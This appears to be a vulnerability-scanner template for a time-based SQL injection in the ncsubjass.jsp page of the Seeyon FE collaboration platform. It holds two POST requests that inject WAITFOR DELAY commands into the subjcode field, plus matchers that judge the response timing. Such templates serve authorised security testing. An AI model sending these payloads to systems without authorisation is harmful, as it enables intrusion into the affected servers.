id: poc-yaml-seeyon-hulian-fe-ncsubjass-sqli
info:
  name: 致远互联FE协作办公平台 ncsubjass SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 致远互联FE协作办公平台

http:
  - raw:
      - |
        POST /fenc/ncsubjass.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        subjcode=';WAITFOR DELAY '0:0:5'--
      - |
        POST /fenc/ncsubjass.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        subjcode=';WAITFOR DELAY '0:0:8'--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "WAITFOR DELAY"
          - "hideWindowPanelById"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
